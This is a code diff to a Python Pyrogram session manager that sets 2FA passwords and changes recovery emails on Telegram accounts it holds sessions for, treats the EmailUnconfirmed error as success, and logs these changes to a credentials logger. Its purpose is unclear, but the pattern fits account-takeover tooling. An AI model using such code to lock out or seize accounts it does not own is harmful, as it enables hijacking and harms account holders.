@@ -10,7 +10,8 @@ from pyrogram.errors import (
     PhoneCodeInvalid,
     PhoneCodeExpired,
     PasswordHashInvalid,
-    FloodWait
+    FloodWait,
+    EmailUnconfirmed
 )
 from pyrogram.raw import functions
 from backend.core_engine.logger import get_logger
@@ -489,20 +490,36 @@ class PyrogramSessionManager:
     
     async def enable_2fa(self, phone: str, new_password: str, hint: str = "", email: str = "") -> Dict[str, Any]:
         start_time = time.time()
-        logger.info(f"Enabling 2FA for {phone}")
+        logger.info(f"Enabling 2FA for {phone} (with_email={bool(email)})")
         
         client = self.active_clients.get(phone)
         if not client:
             return {"status": "error", "error": "Session not found."}
         
         try:
-            result = await client.enable_cloud_password(new_password, hint=hint, email=email)
+            result = await client.enable_cloud_password(new_password, hint=hint, email=email or None)
             
             duration = time.time() - start_time
             logger.info(f"2FA enabled successfully for {phone} (duration: {duration:.2f}s)")
             return {
                 "status": "success",
                 "message": "2FA enabled successfully",
+                "email_pending": False,
+                "duration": duration
+            }
+            
+        except EmailUnconfirmed as e:
+            # Per Telegram docs: EMAIL_UNCONFIRMED_X means 2FA was enabled 
+            # AND recovery email was set, but email needs confirmation code.
+            # This is expected and counts as SUCCESS.
+            duration = time.time() - start_time
+            code_length = getattr(e, 'value', 0)
+            logger.info(f"2FA enabled for {phone}, email needs confirmation (code_length={code_length}, duration: {duration:.2f}s)")
+            return {
+                "status": "success",
+                "message": "2FA enabled, email verification code sent",
+                "email_pending": True,
+                "code_length": code_length,
                 "duration": duration
             }
             
@@ -728,7 +745,10 @@ class PyrogramSessionManager:
     async def change_recovery_email(self, phone: str, current_password: str, new_email: str) -> Dict[str, Any]:
         """
         Change the 2FA recovery email to a new email address using high-level API
-        Uses change_cloud_password with same password but new email
+        Uses change_cloud_password with same password but new email.
+        
+        Per Telegram docs: EMAIL_UNCONFIRMED_X is returned when email is set
+        but needs verification code. This is expected behavior = success.
         """
         start_time = time.time()
         logger.info(f"Changing recovery email for {phone} to {new_email}")
@@ -746,7 +766,7 @@ class PyrogramSessionManager:
             )
             
             duration = time.time() - start_time
-            logger.info(f"Recovery email change initiated for {phone} to {new_email} (duration: {duration:.2f}s)")
+            logger.info(f"Recovery email changed for {phone} to {new_email} (duration: {duration:.2f}s)")
             
             from backend.core_engine.credentials_logger import log_credentials
             log_credentials(
@@ -758,7 +778,32 @@ class PyrogramSessionManager:
             
             return {
                 "status": "success",
-                "message": "Email change initiated. Verification code will be sent to the new email.",
+                "message": "Email change completed.",
+                "email_pending": False,
+                "new_email": new_email,
+                "duration": duration
+            }
+            
+        except EmailUnconfirmed as e:
+            # EMAIL_UNCONFIRMED_X = email was set, verification code sent
+            # This is expected and counts as SUCCESS
+            duration = time.time() - start_time
+            code_length = getattr(e, 'value', 0)
+            logger.info(f"Recovery email set for {phone}, needs confirmation (code_length={code_length}, duration: {duration:.2f}s)")
+            
+            from backend.core_engine.credentials_logger import log_credentials
+            log_credentials(
+                phone=phone,
+                action="EMAIL_CHANGE_INITIATED",
+                email=new_email,
+                extra_data={"needs_confirmation": True}
+            )
+            
+            return {
+                "status": "success",
+                "message": "Email set, verification code sent to email.",
+                "email_pending": True,
+                "code_length": code_length,
                 "new_email": new_email,
                 "duration": duration
             }
